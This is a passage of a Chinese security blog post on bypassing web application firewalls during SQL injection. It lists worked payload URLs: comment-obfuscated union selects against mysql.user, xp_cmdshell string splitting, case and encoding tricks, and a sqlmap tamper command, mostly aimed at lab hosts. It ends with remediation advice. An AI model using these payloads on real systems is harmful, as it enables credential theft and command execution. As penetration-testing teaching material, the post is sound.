+<p><a target="_blank" rel="noopener" href="http://192.168.0.142:8080/sql.php?id=1/*%7C%23--%23%7C*/and/*%7C%23--%23%7C*/1=2">http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2</a></p>
+</blockquote>
+<p><strong>绕过策略二：特殊字符拼接</strong></p>
+<blockquote>
+<p>把特殊字符拼接起来绕过WAF的检测，比如在Mysql中，可以利用注释/**/来绕过，在mssql中，函数里面可以用+来拼接</p>
+<p>如：GET /pen/news.php?id=1;exec(master..xp_cmdshell ‘netuser’)</p>
+<p><strong>可以改为：GET /pen/news.php?id=1;exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)</strong></p>
+</blockquote>
+<p><strong>绕过策略三：注释包含关键字</strong></p>
+<blockquote>
+<p>在mysql中，可以利用/<em>!</em>/包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容。测试最新版本的WAF可以完美绕过。</p>
+<p>如: GET /pen/news.php?id=1 union select user,password frommysql.user</p>
+<p>可以改为: GET /pen/news.php?id=1 /<em>!union</em>//<em>!select</em>/  user,password /<em>!from</em>/ mysql.user</p>
+</blockquote>
+<p><strong>绕过策略四：</strong></p>
+<p><strong>也可以尝试seelct~ select~1 select! select@等绕过成功，</strong></p>
+<h3 id="（5）空格替换法"><a href="#（5）空格替换法" class="headerlink" title="（5）空格替换法"></a>（5）空格替换法</h3><blockquote>
+<p>把空格替换成%0a/<strong>/可以绕过最新版本WAF, 在Pangolin中 点击 编辑– 配置– 高级– 选择替换空格使用– 填上%0a/</strong>/即可</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.142:8080/sql.php?id=1%2520union%2523%250aselect%2523%250a1,user(),3,4,5">http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5</a></p>
+</blockquote>
+<p><img src="/image/waf/6.jpg"></p>
+<h3 id="（6）使用大小写"><a href="#（6）使用大小写" class="headerlink" title="（6）使用大小写"></a>（6）使用大小写</h3><blockquote>
+<p>​    <a target="_blank" rel="noopener" href="http://www.***.com/index.php?page_id=-15uNIoN">http://www.***.com/index.php?page_id=-15uNIoN</a> sELecT 1,2,3,4….</p>
+</blockquote>
+<h3 id="（7）关键字替换"><a href="#（7）关键字替换" class="headerlink" title="（7）关键字替换"></a>（7）关键字替换</h3><blockquote>
+<p>​    <a target="_blank" rel="noopener" href="http://www.***.com/index.php?page_id=-15UNIunionON">http://www.***.com/index.php?page_id=-15UNIunionON</a> SELselectECT 1,2,3,4….</p>
+<p>​    此方法适用于一些会把union</p>
+<p>select替换掉的WAF，经过WAF过滤后就会变成union select 1,2,3,4….</p>
+</blockquote>
+<h3 id="（8）编码与注释结合"><a href="#（8）编码与注释结合" class="headerlink" title="（8）编码与注释结合"></a>（8）编码与注释结合</h3><blockquote>
+<p>   <a target="_blank" rel="noopener" href="http://www.***.com/index.php?page_id=-15">http://www.***.com/index.php?page_id=-15</a> %55nION/**/%53ElecT 1,2,3,4…</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5">http://192.168.0.142:8080/sql.php?id=1/<em>!50000</em>/union/<em>!50000</em>/select/<em>!50000</em>/1,user(),3,4,5</a></p>
+<p>也可以这样</p>
+<p><a target="_blank" rel="noopener" href="http://192.11.22.55/sqli/Less-1/?id=1&#39;">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> and /<em>!1=1</em>/ %23 (WAF不拦截)</p>
+<p>​     U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/</p>
+<p>手工进行加注释进行注入太慢，一般我们通过Sqlmap这类工具来实现自动注入:</p>
+<p>sqlmap.py -u “URL”–tamper=”versionedmorekeywords.py” –dealy=1</p>
+</blockquote>
+<h3 id="（9）利用WAF本身的功能绕过"><a href="#（9）利用WAF本身的功能绕过" class="headerlink" title="（9）利用WAF本身的功能绕过"></a>（9）利用WAF本身的功能绕过</h3><blockquote>
+<p>​     假如你发现WAF会把”*”替换为空，那么你就可以利用这一特性来进行绕过</p>
+<p>‍‍‍<a target="_blank" rel="noopener" href="http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4">http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4</a>….</p>
+<p>其它方法-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select1,2,3,4…)</p>
+</blockquote>
+<h3 id="（10）使用其他变量或者命令对注入语句进行替换"><a href="#（10）使用其他变量或者命令对注入语句进行替换" class="headerlink" title="（10）使用其他变量或者命令对注入语句进行替换"></a>（10）使用其他变量或者命令对注入语句进行替换</h3><blockquote>
+<p>COMMAND | WHAT TO USE INSTEAD</p>
+<p>@@version | version()</p>
+<p>concat() | concat_ws()</p>
+<p>group_concat() | concat_ws()</p>
+<p>= | like</p>
+</blockquote>
+<p>  这种在实际绕过WAF过程中很有作用，如下实例:</p>
+<p><img src="/image/waf/7.jpg"></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.20.18:8080/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20/*!%09SELECT*/%20user(),database()+--+&amp;Submit=Submit">http://172.16.20.18:8080/dvwa/vulnerabilities/sqli/?id=1%27%20%55%4e%49%4f%4e%20/*!%09%53%45%4c%45%43%54*/%20user(),database()+--+&amp;Submit=Submit</a></p>
+<h2 id="waf常见特征"><a href="#waf常见特征" class="headerlink" title="waf常见特征"></a>waf常见特征</h2><p>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</p>
+<p>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p>
+<p>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p>
+<p>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p>
+<h2 id="waf常见特点"><a href="#waf常见特点" class="headerlink" title="waf常见特点"></a>waf常见特点</h2><p>• 异常检测协议：拒绝不符合HTTP标准的请求</p>
+<p>• 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</p>
+<p>• 白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题</p>
+<p>• 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</p>
+<p>• 状态管理：重点进行会话保护</p>
+<p>• 另还有：Cookie保护、抗入侵规避技术、响应监视和信息泄露保护等</p>
+<h2 id="WAF的识别扫描器"><a href="#WAF的识别扫描器" class="headerlink" title="WAF的识别扫描器"></a>WAF的识别扫描器</h2><p>• 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix 在内的标识</p>
+<p>• 单IP+ cookie某时间段内触发规则次数</p>
+<p>•隐藏的链接标签等</p>
+<p>•Cookie植入</p>
+<p>•验证码验证，扫描器无法自动填充验证码</p>
+<p>•单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</p>
+<h2 id="SQL修复建议"><a href="#SQL修复建议" class="headerlink" title="SQL修复建议"></a>SQL修复建议</h2><p>• 常用得SQL注入漏洞得修复方法有两种</p>
+<h4 id="•-1-过滤危险字符"><a href="#•-1-过滤危险字符" class="headerlink" title="• 1.过滤危险字符"></a>• 1.过滤危险字符</h4><p>• 多数CMS都采用过滤字符的方式，例如，采用正则表达式匹配union、 sleep、load_file等关键字，如果匹配到，则退出程序。</p>
+<h3 id="•-2-使用预编译语句"><a href="#•-2-使用预编译语句" class="headerlink" title="• 2.使用预编译语句"></a>• 2.使用预编译语句</h3><p>• 其实使用PDO预编译语句，需要注意的是，不要将变量直接拼接到PDO语 句中，而是使用占位符进行数据库的增加、删除、修改、查询。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/05/09/waf%E7%BB%95%E8%BF%87/">https://zhangyanlady.github.io/2020/05/09/waf%E7%BB%95%E8%BF%87/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/17/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E/">常见端口及其漏洞</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
